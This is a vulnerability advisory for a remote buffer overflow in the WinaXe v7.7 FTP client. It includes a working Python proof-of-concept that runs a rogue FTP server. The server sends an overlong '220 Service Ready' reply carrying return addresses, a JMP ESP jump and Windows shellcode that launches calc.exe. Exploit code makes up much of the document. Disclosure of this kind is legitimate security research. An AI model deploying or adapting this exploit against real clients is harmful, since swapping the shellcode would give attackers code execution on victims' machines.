@@ -1,0 +1,112 @@
+[+] Credits: John Page aka hyp3rlinx	
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/WINAXE-FTP-CLIENT-REMOTE-BUFFER-OVERFLOW.txt
+
+[+] ISR: Apparition Security
+
+
+
+Vendor:
+============
+www.labf.com
+
+
+
+Product:
+================
+WinaXe v7.7 FTP 
+
+The X Window System, SSH, TCP/IP, NFS, FTP, TFTP and Telnet software are built and provided in the package.
+All that you need to run remote UNIX and X Applications is included within WinaXe Plus. You operate simultaneously with
+X11, FTP and Telnet sessions and with your familiar MS Windows applications.
+
+
+
+Vulnerability Type:
+=======================
+Remote Buffer Overflow
+
+
+
+Vulnerability Details:
+======================
+
+WinaXe v7.7 FTP client is subject to MULTIPLE remote buffer overflow vectors when connecting to a malicious FTP Server and
+receiving overly long payloads in the command response from the remote server.
+
+220 SERVICE READY 
+331 USER / PASS
+200 TYPE
+257 PWD
+
+etc...
+
+below is POC for "server ready" 220 command exploit when first connecting to a FTP server.
+
+
+Exploit code(s):
+===============
+
+import socket,struct
+
+#WinaXe v7.7 FTP Client 'Service Ready' Command Buffer Overflow Exploit
+#Discovery hyp3rlinx
+#ISR: ApparitionSec
+#hyp3rlinx.altervista.org
+
+
+#shellcode to pop calc.exe Windows 7 SP1
+sc=("\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B"
+"\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B"
+"\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31"
+"\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA"
+"\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14"
+"\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x65\x78\x65"
+"\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC")
+
+
+eip=struct.pack('<L',0x68084A6F)    #POP ECX RET 
+jmpesp=struct.pack('<L',0x68017296) #JMP ESP
+
+#We will do POP ECX RET and place a JMP ESP address at the RET address that will jump to shellcode.
+
+payload="A"*2061+eip+jmpesp+"\x90"*10+sc+"\x90"*20     #Server Ready '220' Exploit
+
+port = 21                   
+s = socket.socket()
+host = '127.0.0.1'              
+s.bind((host, port))            
+s.listen(5)                    
+
+print 'Evil FTPServer listening...'
+
+while True:
+    conn, addr = s.accept()     
+    conn.send('220'+payload+'\r\n')
+    conn.close()
+
+
+
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+
+Severity Level:
+================
+High
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
